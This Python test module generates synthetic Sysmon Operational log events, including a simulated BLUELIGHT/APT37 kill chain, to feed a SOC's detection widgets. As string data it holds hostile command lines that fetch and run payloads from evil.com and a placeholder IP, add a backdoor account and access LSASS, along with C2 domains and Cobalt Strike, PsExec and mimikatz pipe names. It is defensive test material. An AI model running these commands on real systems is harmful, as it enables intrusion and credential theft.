"""Auto-extracted from generate_test_logs.py — sysmon operational synthetic events.

Behavior-preserving split: function bodies are unchanged. Shared constants and
helpers live in ``testlogs.common`` and are imported via star import.
"""
import json
import ntpath
import os
import random
import re
import sys
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from testlogs.common import *  # noqa: F401,F403


def sysmon_op_event(event_id, host=None, user=None, source_image=None,
                    target_image=None, command_line=None,
                    dest_hostname=None, dest_ip=None, dest_port=None,
                    query_name=None, query_results=None,
                    pipe_name=None, target_filename=None,
                    target_object=None, parent_image=None,
                    granted_access=None, msg=None, offset=0):
    """Generate a Sysmon Operational JSON entry via the canonical builder.

    Delegates to ``schemas.build_windows_sysmon_event`` so the record matches
    the real Microsoft-Windows-Sysmon/Operational EVTX shape (Channel,
    Provider, native PascalCase fields ``Image``, ``CommandLine``,
    ``ParentImage``, ``TargetImage``, ``PipeName``, ``QueryName``,
    ``DestinationIp``, ``GrantedAccess``) plus the parallel OCI Log Analytics
    display-name columns (``Process Name``, ``Source Process``, ``Target
    Process``, ``Granted Access``, ``Target Object``).

    The detections layer keeps the ``Source Process``/``Target Process``
    aliases that the BLUELIGHT and Sysmon-Operational queries reference even
    when the canonical builder treats them as optional.
    """
    from schemas import build_windows_sysmon_event

    if host is None:
        host = random.choice(SEVEN_KINGDOMS_HOSTS)
    if user is None:
        user = random.choice(THREAT_ACTORS)

    image = source_image or target_image or ""
    event = build_windows_sysmon_event(
        int(event_id),
        event_time=ts(offset),
        computer=host,
        user=user,
        image=image,
        command_line=command_line or "",
        parent_image=parent_image or source_image or "",
        target_image=target_image or "",
        source_image=source_image or "",
        pipe_name=pipe_name or "",
        query_name=query_name or "",
        query_results=query_results or "",
        target_filename=target_filename or "",
        destination_ip=dest_ip or "",
        destination_port=dest_port or "",
        granted_access=granted_access or "",
    )
    # Operational-channel override — the SOC source registered in
    # ``setup_log_sources.py`` keys on this Channel.
    event["Channel"] = "Microsoft-Windows-Sysmon/Operational"
    event["log_source_identifier"] = "Windows Sysmon Operational Logs"
    event["Log Source"] = "Windows Sysmon Operational Logs"
    # Detection-layer aliases the BLUELIGHT widgets and Sysmon Operational
    # parser rely on; keep them populated even when empty so projection
    # against ``'Source Process'`` etc. resolves cleanly.
    event["Source Process"] = source_image or ""
    event["Target Process"] = target_image or ""
    event["Process Name"] = image
    event["Parent Process Name"] = parent_image or source_image or ""
    event["Command Line"] = command_line or ""
    event["Destination Hostname"] = dest_hostname or ""
    event["Destination IP"] = dest_ip or ""
    event["Destination Port"] = str(dest_port) if dest_port else ""
    event["Source IP"] = ""
    event["Query Name"] = query_name or ""
    event["Query Results"] = query_results or ""
    event["Pipe Name"] = pipe_name or ""
    event["Target Filename"] = target_filename or ""
    event["Target Object"] = target_object or ""
    event["Granted Access"] = granted_access or ""
    # Native field aliases for parser fall-back paths.
    event["EndpointOS"] = "Windows"
    event["EventID"] = str(event_id)
    event["DestinationHostname"] = dest_hostname or ""
    event["DestinationIp"] = dest_ip or ""
    event["DestinationPort"] = str(dest_port) if dest_port else ""
    event["QueryName"] = query_name or ""
    event["QueryResults"] = query_results or ""
    event["PipeName"] = pipe_name or ""
    event["TargetFilename"] = target_filename or ""
    event["TargetObject"] = target_object or ""
    event["ParentImage"] = parent_image or source_image or ""
    event["SourceImage"] = source_image or ""
    event["TargetImage"] = target_image or ""
    event["CommandLine"] = command_line or ""
    event["GrantedAccess"] = granted_access or ""
    event["msg"] = msg or f"Sysmon Event {event_id}"
    add_windows_event_envelope(
        event,
        channel="Microsoft-Windows-Sysmon/Operational",
        provider="Microsoft-Windows-Sysmon",
        provider_guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
        event_data_fields=[
            "UtcTime", "Image", "SourceImage", "TargetImage", "CommandLine",
            "ParentImage", "ParentCommandLine", "DestinationHostname",
            "DestinationIp", "DestinationPort", "QueryName", "QueryResults",
            "PipeName", "TargetFilename", "TargetObject", "GrantedAccess",
            "Hashes",
        ],
    )
    return event


def _bluelight_kill_chain_sysmon_op_events():
    """Emit BLUELIGHT (S0657 / APT37) IOCs covering every per-widget detection.

    Volexity research: https://www.volexity.com/blog/2021/08/17/north-korean-bluelight-special/
    Each block targets a specific detection rule under queries/bluelight_*.json so
    that all dashboard widgets return rows when this dataset is ingested.
    """
    events = []
    apt_host = "WS01.sevenkingdoms.local"
    apt_user = "joffrey"
    apt_image = "C:\\Users\\Public\\bluelight.exe"
    iexplore = "C:\\Program Files\\Internet Explorer\\iexplore.exe"
    powershell = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    cmd = "C:\\Windows\\System32\\cmd.exe"
    rundll32 = "C:\\Windows\\System32\\rundll32.exe"

    base = 1000

    file_discovery_cmds = [
        ("dir /s /b C:\\Users\\joffrey\\Documents", iexplore, cmd),
        ("dir /s C:\\Users\\joffrey\\Desktop\\*.docx", iexplore, cmd),
        ("powershell -Command Get-ChildItem -Recurse -Path C:\\Users -Filter *.pdf",
         iexplore, powershell),
        ("tree C:\\Users\\joffrey /F", "C:\\Windows\\System32\\wscript.exe", cmd),
    ]
    for i, (cl, parent, image) in enumerate(file_discovery_cmds):
        events.append(sysmon_op_event(
            1,
            host=apt_host, user=apt_user,
            source_image=image, parent_image=parent,
            command_line=cl,
            msg="BLUELIGHT: file discovery from browser child",
            offset=base + i,
        ))

    sec_paths = [
        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend",
        "HKLM\\SOFTWARE\\Microsoft\\Security Center\\SecurityCenter2",
        "HKLM\\SOFTWARE\\Windows Defender\\Exclusions",
        "HKLM\\SOFTWARE\\AVAST Software\\Avast",
        "HKLM\\SOFTWARE\\ESET\\ESET Security",
        "HKLM\\SOFTWARE\\KasperskyLab\\AVP",
    ]
    for i, target in enumerate(sec_paths):
        events.append(sysmon_op_event(
            12 + (i % 3),
            host=apt_host, user=apt_user,
            source_image=apt_image, parent_image=apt_image,
            target_object=target,
            msg="BLUELIGHT: registry enumeration of security products",
            offset=base + 50 + i,
        ))

    yara_pdb_cmds = [
        "C:\\Development\\BACKDOOR\\ncov\\Release\\bluelight.pdb",
        "powershell -Command Get-Content C:\\Users\\Public\\Release\\bluelight.pdb",
    ]
    for i, cl in enumerate(yara_pdb_cmds):
        events.append(sysmon_op_event(
            1,
            host=apt_host, user=apt_user,
            source_image=apt_image, parent_image=cmd,
            command_line=cl,
            msg="BLUELIGHT YARA: PDB path indicator",
            offset=base + 100 + i,
        ))
    events.append(sysmon_op_event(
        11,
        host=apt_host, user=apt_user,
        source_image=apt_image, parent_image=apt_image,
        target_filename="C:\\Users\\Public\\BACKDOOR\\ncov\\bluelight.pdb",
        msg="BLUELIGHT YARA: PDB file write",
        offset=base + 110,
    ))

    yara_recon_cmds = [
        'curl https://ipinfo.io/json',
        'powershell -Command Invoke-WebRequest -Uri https://ipinfo.io',
        'cmd /c echo {"UserName":"joffrey","ComName":"WS01","OnlineIP":"203.0.113.10","LocalIP":"10.0.1.10","AntiVirus":"Windows Defender","Process Level":"Medium","VM":"false"}',
    ]
    for i, cl in enumerate(yara_recon_cmds):
        events.append(sysmon_op_event(
            1,
            host=apt_host, user=apt_user,
            source_image=apt_image if i == 2 else powershell,
            parent_image=apt_image,
            command_line=cl,
            msg="BLUELIGHT YARA: system reconnaissance JSON",
            offset=base + 130 + i,
        ))

    yara_cookie_cmds = [
        'powershell -Command "cookie_name: OSID, cookie_name: SID, __Secure-3PSID"',
        'cmd /c echo cookie_name: __Secure-3PSID',
        'powershell -Command "Failed to get chrome cookie"',
        'powershell -Command "Failed to get Edge cookie database"',
        'cmd /c echo GM_ACTION_TOKEN=abc GM_ID_KEY=xyz',
        'cmd /c echo mail/u/0/?ik=abc Success to enable imap',
        'cmd /c echo Success to enable thunder access',
    ]
    for i, cl in enumerate(yara_cookie_cmds):
        events.append(sysmon_op_event(
            1,
            host=apt_host, user=apt_user,
            source_image=apt_image, parent_image=apt_image,
            command_line=cl,
            msg="BLUELIGHT YARA: chrome/edge cookie theft",
            offset=base + 150 + i,
        ))

    keylog_files = [
        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\cheV01.dat", "BLUELIGHT YARA: keylog cheV01"),
        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\INTEG.RAW", "BLUELIGHT YARA: keylog INTEG.RAW"),
        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\keylog.dat", "BLUELIGHT YARA: keylog dat"),
        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\keylog.log", "BLUELIGHT YARA: keylog log"),
        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\edb.chk", "BLUELIGHT YARA: edb.chk"),
        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\edb.log", "BLUELIGHT YARA: edb.log"),
        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\edbres00001.jrs", "BLUELIGHT YARA: edbres jrs"),
        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\edbres00002.jrs", "BLUELIGHT YARA: edbres jrs"),
        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\edbtmp.log", "BLUELIGHT YARA: edbtmp.log"),
    ]
    for i, (path, msg) in enumerate(keylog_files):
        events.append(sysmon_op_event(
            11,
            host=apt_host, user=apt_user,
            source_image=apt_image, parent_image=apt_image,
            target_filename=path,
            msg=msg,
            offset=base + 200 + i,
        ))

    yara_google_cmds = [
        'cmd /c echo Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5',
        'cmd /c echo User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:80.0) Gecko/20100101 Firefox/80.0',
        'cmd /c echo AccountSettingsUi/data/batchexecute SNlM0e BqLdsd token',
    ]
    for i, cl in enumerate(yara_google_cmds):
        events.append(sysmon_op_event(
            1,
            host=apt_host, user=apt_user,
            source_image=apt_image, parent_image=apt_image,
            command_line=cl,
            msg="BLUELIGHT YARA: Google App C2 indicator",
            offset=base + 230 + i,
        ))

    ingress_files = [
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\stage2.exe",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\loader.dll",
        "C:\\Users\\Public\\AppData\\Roaming\\update.scr",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\runner.bat",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\stager.ps1",
    ]
    for i, path in enumerate(ingress_files):
        events.append(sysmon_op_event(
            11,
            host=apt_host, user=apt_user,
            source_image=apt_image, parent_image=apt_image,
            target_filename=path,
            msg=f"BLUELIGHT: ingress tool transfer ({path.split(chr(92))[-1]})",
            offset=base + 260 + i,
        ))

    wmi_cmds = [
        "powershell -Command Get-WmiObject -Class Win32_ComputerSystem",
        "powershell -Command Get-CimInstance -ClassName Win32_OperatingSystem",
        "wmic.exe path Win32_Processor get Name",
        "wmic.exe path Win32_NetworkAdapterConfiguration get IPAddress",
    ]
    for i, cl in enumerate(wmi_cmds):
        events.append(sysmon_op_event(
            1,
            host=apt_host, user=apt_user,
            source_image=powershell if "powershell" in cl else "C:\\Windows\\System32\\wbem\\wmic.exe",
            parent_image=iexplore,
            command_line=cl,
            msg="BLUELIGHT: WMI system enumeration from browser child",
            offset=base + 300 + i,
        ))

    child_proc_set = [
        ("cmd.exe /c whoami", cmd),
        ("powershell.exe -NoProfile -Command Get-Process", powershell),
        ("wscript.exe C:\\Users\\Public\\loader.vbs", "C:\\Windows\\System32\\wscript.exe"),
        ("mshta.exe http://203.0.113.20/payload.hta", "C:\\Windows\\System32\\mshta.exe"),
        ("cscript.exe //e:vbs C:\\Users\\Public\\dropper.vbs", "C:\\Windows\\System32\\cscript.exe"),
        ("rundll32.exe C:\\Users\\Public\\stage.dll,RunMain", rundll32),
    ]
    for i, (cl, image) in enumerate(child_proc_set):
        events.append(sysmon_op_event(
            1,
            host=apt_host, user=apt_user,
            source_image=image, parent_image=iexplore,
            command_line=cl,
            msg="BLUELIGHT: browser spawning suspicious child process",
            offset=base + 330 + i,
        ))

    return events


def generate_sysmon_operational():
    """Generate Sysmon Operational events for multicloudoperations widgets."""
    events = []

    # ── Event 1: Process Creation ──
    procs = [
        ("C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -NoProfile -enc SQBFAFgA"),
        ("C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\System32\\whoami.exe",
         "whoami /all"),
        ("C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\System32\\net.exe",
         "net user hacker P@ssw0rd /add"),
        ("C:\\Windows\\explorer.exe", "C:\\Users\\Public\\malware.exe",
         "malware.exe --connect 185.215.113.206"),
        ("C:\\Windows\\System32\\mshta.exe", "C:\\Windows\\System32\\cmd.exe",
         "cmd.exe /c powershell.exe -ep bypass -c IEX(iwr http://evil.com/ps.ps1)"),
        ("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\System32\\cmd.exe",
         "cmd.exe /c certutil -urlcache -f http://evil.com/payload.exe"),
        ("C:\\Windows\\System32\\wbem\\wmiprvse.exe", "C:\\Windows\\System32\\cmd.exe",
         "cmd.exe /c whoami"),
    ]
    for i, (parent, child, cmd) in enumerate(procs):
        for j in range(4):
            events.append(sysmon_op_event(
                1, source_image=parent, target_image=child,
                command_line=cmd,
                user=random.choice(THREAT_ACTORS),
                msg=f"Process Create: {child.split(chr(92))[-1]}",
                offset=i*5+j,
            ))

    # Extra Event 1 with suspicious parent processes (for the "Suspicious Process Chains" widget)
    suspicious_parents = [
        "C:\\Windows\\System32\\cmd.exe",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "C:\\Windows\\System32\\mshta.exe",
        "C:\\Windows\\System32\\wscript.exe",
        "C:\\Windows\\System32\\wbem\\wmiprvse.exe",
    ]
    for i, parent in enumerate(suspicious_parents):
        for j in range(3):
            events.append(sysmon_op_event(
                1, source_image=parent,
                target_image=f"C:\\Windows\\System32\\{'cmd.exe' if j % 2 == 0 else 'powershell.exe'}",
                command_line=f"{'cmd.exe /c' if j % 2 == 0 else 'powershell.exe -ep bypass'} suspicious_command_{i}_{j}",
                user=random.choice(THREAT_ACTORS),
                msg="Process Create: suspicious child process",
                offset=100+i*5+j,
            ))

    # ── Event 3: Network Connections (C2 ports) ──
    c2_ports = [4444, 8443, 8080, 9090, 5555, 1337, 3333, 6666, 443]
    c2_ips = ["185.215.113.206", "103.253.41.45", "89.34.111.113", "5.252.178.48"]
    for i, port in enumerate(c2_ports):
        for j in range(3):
            events.append(sysmon_op_event(
                3,
                source_image=random.choice([
                    "C:\\Windows\\System32\\cmd.exe",
                    "C:\\Users\\Public\\beacon.exe",
                    "C:\\Windows\\System32\\powershell.exe",
                ]),
                dest_ip=random.choice(c2_ips),
                dest_port=port,
                dest_hostname=random.choice(["evil-c2.duckdns.org", "beacon.example.xyz", "update.evil.cc"]),
                user=random.choice(THREAT_ACTORS),
                msg=f"Network connection detected to port {port}",
                offset=200+i*4+j,
            ))

    # ── Event 8: CreateRemoteThread (Process Injection T1055) ──
    for i in range(8):
        events.append(sysmon_op_event(
            8,
            source_image=random.choice([
                "C:\\Users\\Public\\injector.exe",
                "C:\\Windows\\System32\\cmd.exe",
                "C:\\Temp\\payload.exe",
            ]),
            target_image=random.choice([
                "C:\\Windows\\System32\\svchost.exe",
                "C:\\Windows\\System32\\explorer.exe",
                "C:\\Windows\\System32\\notepad.exe",
            ]),
            user=random.choice(THREAT_ACTORS),
            msg="CreateRemoteThread detected",
            offset=300+i,
        ))

    # ── Event 10: ProcessAccess to LSASS (T1003 Credential Dump) ──
    for i in range(8):
        events.append(sysmon_op_event(
            10,
            source_image=random.choice([
                "C:\\Temp\\mimikatz.exe",
                "C:\\Tools\\procdump.exe",
                "C:\\Windows\\System32\\rundll32.exe",
            ]),
            target_image="C:\\Windows\\System32\\lsass.exe",
            granted_access="0x1010",
            user=random.choice(THREAT_ACTORS),
            msg="Process accessed lsass.exe",
            offset=400+i,
        ))

    # ── Event 11: File Creation (Startup folder persistence T1547) ──
    startup_files = [
        "C:\\Users\\joffrey\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.exe",
        "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.bat",
        "C:\\Users\\arya\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.vbs",
    ]
    for i, fname in enumerate(startup_files):
        for j in range(2):
            events.append(sysmon_op_event(
                11,
                source_image="C:\\Windows\\System32\\cmd.exe",
                target_filename=fname,
                user=random.choice(THREAT_ACTORS),
                msg=f"File created: {fname.split(chr(92))[-1]}",
                offset=500+i*3+j,
            ))

    # More Event 11: General file creates
    for i in range(6):
        events.append(sysmon_op_event(
            11,
            source_image="C:\\Windows\\System32\\powershell.exe",
            target_filename=f"C:\\Temp\\payload_{i}.exe",
            user=random.choice(THREAT_ACTORS),
            msg=f"File created: payload_{i}.exe",
            offset=520+i,
        ))

    # ── Event 29: FileExecutableDetected (Sysmon 15+) ──
    executable_drops = [
        "C:\\Users\\Public\\Downloads\\invoice_viewer.exe",
        "C:\\Windows\\Temp\\wucache.exe",
        "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updater.exe",
    ]
    for i, fname in enumerate(executable_drops):
        events.append(sysmon_op_event(
            29,
            source_image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            target_filename=fname,
            user=random.choice(THREAT_ACTORS),
            msg=f"File executable detected: {fname.split(chr(92))[-1]}",
            offset=526+i,
        ))

    # BLUELIGHT-style periodic screenshot staging.
    for i in range(8):
        events.append(sysmon_op_event(
            11,
            source_image="C:\\Users\\Public\\bluelight.exe",
            target_filename=f"C:\\Users\\joffrey\\AppData\\Local\\Temp\\capture_{i}.jpg",
            user="joffrey",
            msg=f"File created: capture_{i}.jpg",
            offset=530,
        ))

    for i, browser in enumerate([
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
        "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        "C:\\Program Files\\Internet Explorer\\iexplore.exe",
    ]):
        events.append(sysmon_op_event(
            10,
            host="WS01.sevenkingdoms.local",
            user="joffrey",
            source_image="C:\\Users\\Public\\bluelight.exe",
            target_image=browser,
            granted_access="0x1fffff",
            msg=f"BLUELIGHT browser credential access: {ntpath.basename(browser)}",
            offset=545 + i,
        ))

    events.extend(_bluelight_kill_chain_sysmon_op_events())

    # ── Event 17: Named Pipe Creation (C2 indicator) ──
    # Includes pipe-name fingerprints used by:
    #   - Cobalt Strike post-ex: MSSE-*, postex_*, postex_ssh_*, status_*,
    #     msagent_*, interprocess, mojo, DserNamePipe, winsock, UIA_PIPE
    #   - PsExec lateral movement: PSEXESVC, csexec, remcom, PAExec
    #   - Mimikatz coercion / RPC: lsass, ntsvcs, scerpc, samr, evil_pipe
    pipes = [
        # Generic / placeholders kept for backwards compatibility
        "\\\\.\\pipe\\evil_pipe", "\\\\.\\pipe\\cobaltstrike",
        "\\\\.\\pipe\\meterpreter", "\\\\.\\pipe\\msf_rpc",
        "\\\\.\\pipe\\beacon_pipe",
        # Cobalt Strike named-pipe IOCs (T1055.011)
        "\\\\.\\pipe\\MSSE-1234-server",
        "\\\\.\\pipe\\MSSE-9876-secret",
        "\\\\.\\pipe\\postex_4f3c",
        "\\\\.\\pipe\\postex_ssh_a1b2",
        "\\\\.\\pipe\\status_77",
        "\\\\.\\pipe\\msagent_55",
        "\\\\.\\pipe\\interprocess_8e",
        "\\\\.\\pipe\\mojo.5550.7421.81",
        "\\\\.\\pipe\\chrome.5550.7421.81",
        "\\\\.\\pipe\\DserNamePipe22",
        "\\\\.\\pipe\\winsock-2",
        "\\\\.\\pipe\\UIA_PIPE_010",
        # PsExec named-pipe IOCs (T1021.002)
        "\\\\.\\pipe\\PSEXESVC",
        "\\\\.\\pipe\\PSEXESVC-WS01-1234-stdin",
        "\\\\.\\pipe\\PSEXESVC-WS02-5678-stdout",
        "\\\\.\\pipe\\psexec",
        "\\\\.\\pipe\\csexec",
        "\\\\.\\pipe\\remcom_communicaton",
        "\\\\.\\pipe\\PAExec-1234-WS01",
        # Mimikatz / coercion named pipes (T1003)
        "\\\\.\\pipe\\mimikatz",
        "\\\\.\\pipe\\mimikatz_lsass",
        "\\\\.\\pipe\\lsadump_secrets",
        "\\\\.\\pipe\\ntsvcs_steal",
    ]
    for i, pipe in enumerate(pipes):
        for j in range(2):
            events.append(sysmon_op_event(
                17,
                source_image="C:\\Windows\\System32\\cmd.exe",
                pipe_name=pipe,
                user=random.choice(THREAT_ACTORS),
                msg=f"Pipe Created: {pipe}",
                offset=600+i*3+j,
            ))

    # ── Event 22: DNS Queries ──
    # Suspicious TLDs for beaconing detection
    suspicious_domains = [
        "evil-c2.duckdns.org", "beacon.malware.xyz", "update.evil.info",
        "c2.attacker.top", "data.exfil.pw", "dns.tunnel.cc",
        "command.control.tk", "stealer.bad.bit",
        "a7f3c91d4e8b2a6c0f9d5e1b3a7c9d2.dnsexfil.example",
        "exfilchunk.dnsexfil.example",
    ]
    normal_domains = [
        "www.google.com", "login.microsoftonline.com", "api.github.com",
        "cdn.cloudflare.com",
    ]
    # Suspicious domain queries
    for i, domain in enumerate(suspicious_domains):
        for j in range(5):
            events.append(sysmon_op_event(
                22,
                source_image=random.choice([
                    "C:\\Windows\\System32\\cmd.exe",
                    "C:\\Users\\Public\\beacon.exe",
                    "C:\\Windows\\System32\\powershell.exe",
                ]),
                query_name=domain,
                query_results=random.choice(c2_ips),
                user=random.choice(THREAT_ACTORS),
                msg=f"DNS query: {domain}",
                offset=700+i*6+j,
            ))
    # Normal DNS queries (for contrast)
    for i, domain in enumerate(normal_domains):
        for j in range(3):
            events.append(sysmon_op_event(
                22,
                source_image="C:\\Windows\\System32\\svchost.exe",
                query_name=domain,
                query_results="142.250.80.46",
                user="SYSTEM",
                msg=f"DNS query: {domain}",
                offset=800+i*4+j,
            ))

    return events
